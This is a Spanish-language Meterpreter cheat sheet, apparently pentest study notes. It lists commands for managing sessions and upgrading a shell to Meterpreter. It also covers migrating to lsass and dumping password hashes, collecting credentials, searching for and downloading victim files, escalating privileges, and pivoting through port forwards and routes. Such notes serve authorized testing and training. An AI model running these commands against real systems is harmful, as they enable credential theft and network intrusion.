# Meterpreter

Tags: #Meterpreter #Metasploit #Comandos #Sesiones #Pivoting

## OBJETIVO

- Gestionar sesiones de Meterpreter en Metasploit
- Convertir shells básicas a sesiones Meterpreter
- Ejecutar comandos, transferir archivos y extraer credenciales desde Meterpreter

## TIPS

1. **Siempre migrar a un proceso estable → evitar que la sesión muera**
2. **Migrar a lsass → permite hashdump | Migrar a explorer → sesión más estable**
3. **sessions -u → upgrade directo de shell a Meterpreter sin módulo extra**
4. **local_exploit_suggester → correrlo siempre después de entrar → busca PrivEsc automático**
5. **background antes de usar módulos → no cerrar la sesión**

---

## 1. GESTIÓN DE SESIONES

```bash
❯ sessions
❯ sessions -l
# Listar todas las sesiones activas

❯ sessions -i <ID>
# Entrar a una sesión específica

❯ sessions -u <ID>
# Upgrade directo de shell básica a Meterpreter → más rápido que el módulo

❯ sessions -k <ID>
# Matar una sesión específica

❯ sessions -K
# Matar todas las sesiones

# Poner sesión en background
❯ Ctrl + Z
❯ background
# Ambos funcionan → sesión queda activa en segundo plano
```

---

## 2. CONVERTIR SHELL A METERPRETER

```bash
# Método 1 → Upgrade directo desde sessions (más rápido)
❯ sessions -u <ID>

# Método 2 → Módulo shell_to_meterpreter
❯ use post/multi/manage/shell_to_meterpreter
❯ set LHOST <IP>
❯ set LPORT 443
❯ set session <ID>
❯ run

❯ sessions -l
# Verificar que se creó la nueva sesión Meterpreter
❯ sessions -i <ID_nuevo>
# Entrar a la nueva sesión con Meterpreter
```

---

## 3. INFORMACIÓN DEL SISTEMA

```bash
❯ sysinfo
# Información del sistema → OS, hostname, arquitectura

❯ getuid
# Usuario actual con el que corre Meterpreter

❯ getprivs
# Privilegios del usuario → buscar SeImpersonatePrivilege

❯ getsystem
# Intentar escalar a SYSTEM automáticamente

❯ ps
# Listar todos los procesos con PID y usuario

❯ pgrep explorer
# Buscar PID de proceso específico → útil antes de migrar

❯ pgrep lsass
# PID de lsass → necesario para hashdump
```

---

## 4. MIGRACIÓN DE PROCESOS

```bash
❯ migrate <PID>
# Migrar a otro proceso → más estable o más privilegios

# Flujo típico para hashdump
❯ pgrep lsass         # Obtener PID de lsass
❯ migrate <PID>       # Migrar a lsass
❯ hashdump            # Ahora funciona → hashes de todos los usuarios

# Si hashdump da error "Operation failed: The parameter is incorrect"
# → migrar a lsass primero → luego intentar de nuevo
```

---

## 5. SISTEMA DE ARCHIVOS

```bash
❯ pwd
# Directorio actual

❯ ls
# Listar contenido del directorio

❯ cd /
# Ir a la raíz C:\

❯ cat file.txt
# Ver contenido de archivo

❯ search -f *.doc
# Buscar archivos por extensión en todo el sistema

❯ search -f *.kdbx
# Buscar archivos KeePass

❯ search -f *password* -d C:\\Users
# Buscar por nombre en directorio específico

❯ download C:\\Users\\usuario\\archivo.txt
# Descargar archivo de la víctima a Kali

❯ upload /home/kali/PowerUP.ps1
# Subir archivo de Kali a la víctima → ruta absoluta en Kali

❯ edit archivo.txt
# Editar archivo directamente en Meterpreter
```

---

## 6. SHELL Y EJECUCIÓN

```bash
❯ shell
# Abrir shell del sistema (CMD en Windows, bash en Linux)

❯ /bin/bash -i
# Si shell no abre correctamente → forzar bash interactiva (Linux)

❯ exit
# Salir de la shell y volver a Meterpreter

❯ execute -f cmd.exe -i -H
# Ejecutar proceso de forma interactiva y oculta

❯ php -f exploit.php
# Ejecutar script PHP si PHP está disponible
```

---

## 7. CREDENCIALES Y PRIVILEGE ESCALATION

```bash
❯ hashdump
# Dump de hashes SAM → requiere SYSTEM o migrar a lsass primero

❯ run post/windows/gather/hashdump
# Alternativa a hashdump como módulo post

❯ run post/windows/gather/credentials/credential_collector
# Recopilar credenciales guardadas en el sistema

❯ run post/multi/recon/local_exploit_suggester
# Sugerir exploits locales de PrivEsc → correr siempre al entrar
```

---

## 8. RED DESDE METERPRETER

```bash
❯ ipconfig
# Interfaces de red de la víctima → buscar múltiples interfaces

❯ arp
# Tabla ARP → IPs de hosts conocidos → revelar otras redes

❯ route
# Tabla de ruteo de la víctima

❯ portfwd add -l 4455 -p 445 -r <IP>
# Port forwarding → traer puerto remoto a Kali
# -l → puerto en Kali | -p → puerto remoto | -r → IP destino

❯ portfwd add -l 2222 -p 22 -r <IP>
# Traer SSH de otra máquina a Kali

❯ portfwd
# Ver todos los port forwards activos

❯ run autoroute -s <IP>.0/24
# Agregar ruta para alcanzar nueva red → conectividad dentro de Metasploit

# Escanear la nueva red desde Metasploit
❯ Ctrl + Z
❯ use auxiliary/scanner/portscan/tcp
❯ set RHOSTS <IP>
❯ set PORTS 1-1000
❯ run
```

---

## 9. MÓDULOS POST ÚTILES

```bash
❯ run post/multi/recon/local_exploit_suggester
# PrivEsc → siempre correr al entrar

❯ run post/windows/manage/migrate
# Migrar automáticamente a proceso más estable

❯ run post/windows/gather/enum_applications
# Enumerar aplicaciones instaladas

❯ run post/windows/gather/enum_shares
# Enumerar shares de red

❯ run post/windows/gather/enum_unattend
# Buscar archivos de instalación desatendida con credenciales

❯ run post/windows/gather/enum_logged_on_users
# Usuarios con sesión activa en el sistema

❯ run post/multi/manage/shell_to_meterpreter
# Convertir shell a Meterpreter (ya configurado)
```